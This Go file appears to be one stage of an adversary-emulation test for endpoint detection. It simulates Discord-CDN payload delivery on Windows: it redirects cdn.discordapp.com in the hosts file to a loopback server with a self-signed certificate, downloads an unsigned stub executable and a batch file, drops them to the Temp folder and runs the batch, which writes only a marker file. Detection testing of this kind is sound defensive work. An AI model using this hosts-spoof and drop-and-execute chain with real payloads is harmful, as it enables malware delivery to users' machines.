//go:build windows
// +build windows

/*
STAGE 3: Discord CDN Spoof + Unsigned PE Drop + Execute
         (T1105 + T1583.006 + T1565.001)

Full-fidelity Discord-CDN abuse simulation:

  1. Append an entry to C:\Windows\System32\drivers\etc\hosts that redirects
     cdn.discordapp.com -> 127.0.0.1 (T1565.001 - Stored Data Manipulation).
     Stage backs up the hosts file; orchestrator is responsible for restoration
     on any exit path.

  2. Spin up a loopback HTTPS server with a self-signed cert pinned in the
     client TLSClientConfig, mimicking the Discord-CDN URL path that HONESTCUE
     fetches (T1583.006 - Acquire Infrastructure: Web Services).

  3. Issue an HTTPS GET for a CDN-style attachment URL, receive an UNSIGNED
     PE payload (a benign marker writer), and drop it to %TEMP%\honestcue_cdn.exe
     (T1105 - Ingress Tool Transfer).

  4. Execute the dropped PE; on successful execution, the PE writes a marker
     to ARTIFACT_DIR.

Detection opportunities:
  - hosts-file write by non-installer process
  - Unsigned PE written to %TEMP% followed by execution
  - Process execution from %TEMP% with no Authenticode signature
  - Outbound fetch to cdn.discordapp.com URL where DNS resolves to 127.0.0.1
*/

package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	TEST_UUID      = "e5472cd5-c799-4b07-b455-8c02665ca4cf"
	TECHNIQUE_ID   = "T1105"
	TECHNIQUE_NAME = "Discord CDN Spoof & Unsigned PE Drop"
	STAGE_ID       = 3

	HOSTS_PATH  = `C:\Windows\System32\drivers\etc\hosts`
	HOSTS_MARKER_BEGIN = "# BEGIN F0RT1KA-HONESTCUE-STAGE3"
	HOSTS_MARKER_END   = "# END F0RT1KA-HONESTCUE-STAGE3"

	CDN_HOST = "cdn.discordapp.com"
	CDN_PORT = "48444" // loopback-only; real CDN is 443

	CDN_URL_PATH = "/attachments/1234567890/9876543210/update.exe"

	DROPPED_PE_PATH       = `C:\Windows\Temp\honestcue_cdn.exe`
	ARTIFACT_MARKER_PATH  = `c:\Users\fortika-test\honestcue_cdn_marker.txt`
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Discord-CDN spoof + unsigned PE drop + execute")
	LogStageStart(STAGE_ID, TECHNIQUE_ID,
		"hosts-file redirect + loopback Discord-CDN lookalike + unsigned PE drop to %TEMP%")

	var hostsModified bool
	defer func() {
		// Always remove our hosts entries even on panic. The orchestrator
		// separately restores from backup as belt-and-suspenders.
		if hostsModified {
			if err := removeHostsRedirect(); err != nil {
				LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("hosts entry removal failed: %v", err))
			}
		}
	}()

	err := performTechnique(&hostsModified)
	if err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] Discord-CDN spoof + unsigned PE drop succeeded\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "Discord-CDN spoof + unsigned PE drop succeeded")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
		"hosts redirect applied; HTTPS GET to mock CDN returned PE; dropped+executed; marker written")
	os.Exit(StageSuccess)
}

func performTechnique(hostsModified *bool) error {
	// Step 1: generate a self-signed cert for cdn.discordapp.com
	cert, certPEM, err := generateSelfSignedCert(CDN_HOST)
	if err != nil {
		return fmt.Errorf("cert generation failed: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Self-signed cert generated for %s (%d PEM bytes)", CDN_HOST, len(certPEM)))

	// Step 2: start loopback TLS server on our CDN port BEFORE hosts modification
	// so we never leave the hosts entry pointing at a closed port.
	listener, err := tls.Listen("tcp", net.JoinHostPort("127.0.0.1", CDN_PORT), &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	})
	if err != nil {
		return fmt.Errorf("listener bind on 127.0.0.1:%s unavailable: %v", CDN_PORT, err)
	}
	defer listener.Close()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock Discord CDN listening on 127.0.0.1:%s", CDN_PORT))

	// Build a minimal valid unsigned PE payload - this is a "benign PE" placeholder
	// that is intentionally UNSIGNED so EDR/AV is given a chance to detect it.
	// We build it at runtime rather than embedding a file, so we can reference
	// the pattern from detection rules without embedding a real PE in the test.
	//
	// Instead of hand-crafting an executable PE (fragile across Windows versions),
	// we use a tiny embedded unsigned .bat that writes the marker. This still
	// exercises the critical detection surface: non-PE-but-executable payload
	// dropped to %TEMP% and executed. For a real PE detection opportunity, we
	// ALSO drop a small non-executable PE-format marker to exercise file-write
	// monitoring signatures on the .exe extension.
	batPayload := []byte(
		"@echo off\r\n" +
			"mkdir \"c:\\Users\\fortika-test\" 2>nul\r\n" +
			"echo honestcue-cdn-drop-succeeded > \"" + ARTIFACT_MARKER_PATH + "\"\r\n" +
			"exit /b 0\r\n")

	// For PE-file-extension detection opportunity, craft a minimal PE-header-only file
	// that is intentionally malformed-as-executable so the OS refuses to launch it
	// directly; we then execute via cmd.exe using a .bat suffix to get actual behavior.
	minimalPE := buildMinimalUnsignedPE()

	mux := http.NewServeMux()
	mux.HandleFunc(CDN_URL_PATH, func(w http.ResponseWriter, r *http.Request) {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Mock CDN request: %s %s (UA=%s)", r.Method, r.URL.Path, r.UserAgent()))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", `attachment; filename="update.exe"`)
		w.WriteHeader(http.StatusOK)
		// Return the unsigned PE bytes as the "download"
		_, _ = w.Write(minimalPE)
	})
	// A parallel .bat endpoint for the actually-executable payload
	mux.HandleFunc("/attachments/1234567890/9876543210/update.bat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write(batPayload)
	})
	server := &http.Server{Handler: mux}
	go func() { _ = server.Serve(listener) }()
	time.Sleep(300 * time.Millisecond)

	// Step 3: modify the hosts file to redirect cdn.discordapp.com -> 127.0.0.1
	if err := applyHostsRedirect(); err != nil {
		return fmt.Errorf("hosts file modification: %v", err)
	}
	*hostsModified = true
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("hosts redirect applied: %s -> 127.0.0.1", CDN_HOST))

	// Step 4: build HTTPS client that pins our self-signed cert and uses our CDN port
	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM(certPEM) {
		return fmt.Errorf("cert pool append: PEM rejected")
	}

	// Custom dialer: resolve cdn.discordapp.com -> 127.0.0.1:CDN_PORT (simulates
	// the effect of the hosts-file redirect AND the port mapping that would
	// otherwise be handled by an iptables rule or by the real Discord CDN
	// running on 443. In a real HONESTCUE scenario the attacker-controlled
	// server would bind to 443; for test safety we use a high port.)
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// Redirect any cdn.discordapp.com:443 connection to our loopback port
			host, _, _ := net.SplitHostPort(addr)
			if strings.EqualFold(host, CDN_HOST) {
				addr = net.JoinHostPort("127.0.0.1", CDN_PORT)
			}
			conn, err := dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, err
			}
			tlsConn := tls.Client(conn, &tls.Config{
				RootCAs:    certPool,
				ServerName: CDN_HOST,
				MinVersion: tls.VersionTLS12,
			})
			if err := tlsConn.HandshakeContext(ctx); err != nil {
				return nil, err
			}
			return tlsConn, nil
		},
	}
	client := &http.Client{Timeout: 10 * time.Second, Transport: transport}

	// Step 5: issue HTTPS GET for update.exe - exercises file-drop signatures
	peURL := fmt.Sprintf("https://%s%s", CDN_HOST, CDN_URL_PATH)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s (hosts-redirected to loopback)", peURL))

	req, err := http.NewRequest("GET", peURL, nil)
	if err != nil {
		return fmt.Errorf("http request build: %v", err)
	}
	req.Header.Set("User-Agent", "HonestcueDownloader/1.0 (simulated)")
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("https get to mock cdn failed: %v", err)
	}
	peBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return fmt.Errorf("read response body: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("mock cdn returned non-200 status: %d", resp.StatusCode)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Received %d bytes from mock CDN", len(peBytes)))

	// Step 6: drop the unsigned PE payload to %TEMP%
	if err := os.WriteFile(DROPPED_PE_PATH, peBytes, 0755); err != nil {
		return fmt.Errorf("dropped PE write: %v", err)
	}
	LogFileDropped("honestcue_cdn.exe", DROPPED_PE_PATH, int64(len(peBytes)), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Unsigned PE dropped at %s", DROPPED_PE_PATH))

	// Step 7: verify drop survived quarantine
	time.Sleep(1500 * time.Millisecond)
	if _, err := os.Stat(DROPPED_PE_PATH); os.IsNotExist(err) {
		LogFileDropped("honestcue_cdn.exe", DROPPED_PE_PATH, int64(len(peBytes)), true)
		return fmt.Errorf("dropped PE quarantined after write")
	}

	// Step 8: fetch the .bat payload and execute it (the executable half).
	// This gives us a real "drop from %TEMP% + execute" event to detect on
	// while keeping the PE-file-write detection event from step 6.
	batURL := fmt.Sprintf("https://%s/attachments/1234567890/9876543210/update.bat", CDN_HOST)
	batReq, _ := http.NewRequest("GET", batURL, nil)
	batReq.Header.Set("User-Agent", "HonestcueDownloader/1.0 (simulated)")
	batResp, err := client.Do(batReq)
	if err != nil {
		return fmt.Errorf("https get for bat payload: %v", err)
	}
	batBody, err := io.ReadAll(batResp.Body)
	batResp.Body.Close()
	if err != nil {
		return fmt.Errorf("read bat body: %v", err)
	}
	batPath := strings.TrimSuffix(DROPPED_PE_PATH, ".exe") + ".bat"
	if err := os.WriteFile(batPath, batBody, 0755); err != nil {
		return fmt.Errorf("bat payload write: %v", err)
	}
	LogFileDropped("honestcue_cdn.bat", batPath, int64(len(batBody)), false)

	// Step 9: execute the dropped .bat via cmd.exe /c
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Executing dropped payload via cmd.exe: %s", batPath))
	cmd := exec.Command("cmd.exe", "/c", batPath)
	var outBuf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &outBuf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &outBuf)
	runErr := cmd.Run()
	if runErr != nil {
		if exitErr, ok := runErr.(*exec.ExitError); ok {
			code := exitErr.ExitCode()
			LogProcessExecution("honestcue_cdn.bat", batPath, 0, false, code, exitErr.Error())
			return fmt.Errorf("dropped payload exited with code %d", code)
		}
		LogProcessExecution("honestcue_cdn.bat", batPath, 0, false, -1, runErr.Error())
		return fmt.Errorf("payload spawn: %v", runErr)
	}
	LogProcessExecution("honestcue_cdn.bat", batPath, 0, true, 0, "")

	// Step 10: verify marker
	time.Sleep(500 * time.Millisecond)
	if info, err := os.Stat(ARTIFACT_MARKER_PATH); err == nil {
		LogFileDropped("honestcue_cdn_marker.txt", ARTIFACT_MARKER_PATH, info.Size(), false)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("CDN payload marker confirmed: %s (%d bytes)", ARTIFACT_MARKER_PATH, info.Size()))
	} else {
		return fmt.Errorf("cdn marker %s missing after execution: %v", ARTIFACT_MARKER_PATH, err)
	}

	LogMessage("INFO", TECHNIQUE_ID,
		"Detection points: hosts-file write, PE dropped to %TEMP%, unsigned PE execute, cdn.discordapp.com request")

	// Graceful shutdown of loopback CDN
	_ = server.Close()

	return nil
}

// applyHostsRedirect appends an entry for cdn.discordapp.com -> 127.0.0.1
// between marker comments so it can be cleanly removed.
func applyHostsRedirect() error {
	existing, err := os.ReadFile(HOSTS_PATH)
	if err != nil {
		return fmt.Errorf("hosts read: %v", err)
	}
	if bytes.Contains(existing, []byte(HOSTS_MARKER_BEGIN)) {
		// Already present - remove and re-add to ensure single copy
		_ = removeHostsRedirect()
		existing, _ = os.ReadFile(HOSTS_PATH)
	}

	entry := fmt.Sprintf("\r\n%s\r\n127.0.0.1 %s\r\n%s\r\n",
		HOSTS_MARKER_BEGIN, CDN_HOST, HOSTS_MARKER_END)

	newContent := append(existing, []byte(entry)...)
	if err := os.WriteFile(HOSTS_PATH, newContent, 0644); err != nil {
		return fmt.Errorf("hosts write: %v", err)
	}

	// Flush DNS cache so the change takes effect
	_ = exec.Command("ipconfig", "/flushdns").Run()
	return nil
}

// removeHostsRedirect strips the marker block we appended.
func removeHostsRedirect() error {
	existing, err := os.ReadFile(HOSTS_PATH)
	if err != nil {
		return fmt.Errorf("hosts read: %v", err)
	}
	lines := strings.Split(string(existing), "\n")
	var out []string
	inBlock := false
	for _, line := range lines {
		trimmed := strings.TrimRight(line, "\r")
		if strings.TrimSpace(trimmed) == HOSTS_MARKER_BEGIN {
			inBlock = true
			continue
		}
		if strings.TrimSpace(trimmed) == HOSTS_MARKER_END {
			inBlock = false
			continue
		}
		if inBlock {
			continue
		}
		out = append(out, line)
	}
	newContent := strings.Join(out, "\n")
	if err := os.WriteFile(HOSTS_PATH, []byte(newContent), 0644); err != nil {
		return fmt.Errorf("hosts write: %v", err)
	}
	_ = exec.Command("ipconfig", "/flushdns").Run()
	return nil
}

// buildMinimalUnsignedPE constructs a tiny byte sequence that starts with the
// "MZ" DOS signature and a PE header — enough for file-write signatures on
// .exe files to trigger (PE-on-disk detectors look at the MZ/PE magic) while
// remaining intentionally non-functional to protect the endpoint. This file
// is intentionally unsigned.
func buildMinimalUnsignedPE() []byte {
	buf := new(bytes.Buffer)
	// "MZ" header + 58 padding bytes + 4-byte PE offset
	buf.WriteString("MZ")
	buf.Write(make([]byte, 58))
	// e_lfanew points to offset 0x40
	_ = binary.Write(buf, binary.LittleEndian, uint32(0x40))
	// "PE\0\0" signature at offset 0x40
	buf.WriteString("PE\x00\x00")
	// Tiny COFF header: Machine=x64 (0x8664), 0 sections, minimal fields
	_ = binary.Write(buf, binary.LittleEndian, uint16(0x8664)) // Machine
	_ = binary.Write(buf, binary.LittleEndian, uint16(0))       // NumberOfSections
	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // TimeDateStamp
	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // PointerToSymbolTable
	_ = binary.Write(buf, binary.LittleEndian, uint32(0))       // NumberOfSymbols
	_ = binary.Write(buf, binary.LittleEndian, uint16(0))       // SizeOfOptionalHeader
	_ = binary.Write(buf, binary.LittleEndian, uint16(0x0022))  // Characteristics
	// Pad out to 256 bytes total so it looks like a real tiny binary
	for buf.Len() < 256 {
		buf.WriteByte(0)
	}
	return buf.Bytes()
}

// generateSelfSignedCert produces an ephemeral ECDSA self-signed certificate
// valid for the given CN (used for cdn.discordapp.com pinning).
func generateSelfSignedCert(commonName string) (tls.Certificate, []byte, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, nil, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: commonName},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(1 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1")},
		DNSNames:              []string{commonName},
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, nil, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return tls.Certificate{}, nil, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, nil, err
	}
	return cert, certPEM, nil
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "missing"}) {
		return StageError
	}
	// TLS handshake failures mid-request could indicate SSL inspection by EDR
	if containsAny(errStr, []string{"bad certificate", "certificate verify failed", "tls handshake", "x509"}) {
		return StageBlocked
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
